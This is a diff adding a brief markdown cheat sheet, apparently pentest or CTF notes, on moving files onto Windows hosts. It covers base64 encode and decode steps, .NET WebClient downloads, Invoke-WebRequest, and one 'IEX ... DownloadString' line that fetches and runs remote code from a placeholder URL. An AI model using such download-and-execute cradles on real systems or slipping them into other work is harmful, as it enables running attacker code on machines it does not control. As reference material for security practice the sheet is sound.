@@ -1,1 +1,30 @@
+**Binary to BASE64**
+cat file.txt | base64 -w 0;echo
+base64 file.txt > file.b64
+
+Powershell:
+$base64 = "SFRCe3sxMjN9Cg=="
+[System.IO.File]::WriteAllBytes("file.txt",[System.Convert]::FromBase64String($base64))
+
+**.NET DownloadFile()**
+(New-Object Net.WebClient).DownloadFile(
+  'https://example.com/test.txt',
+  'C:\Temp\test.txt'
+)
+
+**.NET DownloadFileAsync()**
+(New-Object Net.WebClient).DownloadFileAsync(
+  'https://example.com/test.txt',
+  'C:\Temp\test.txt'
+)
+
+**.NET DownloadString(URL)**
+IEX (New-Object Net.WebClient).DownloadString('https://example.com/test.txt')
+
+**Invoke-WebRequest**
+Invoke-WebRequest https://example.com/test.txt -OutFile test.txt -UseBasicParsing
+
+**
+
+
 
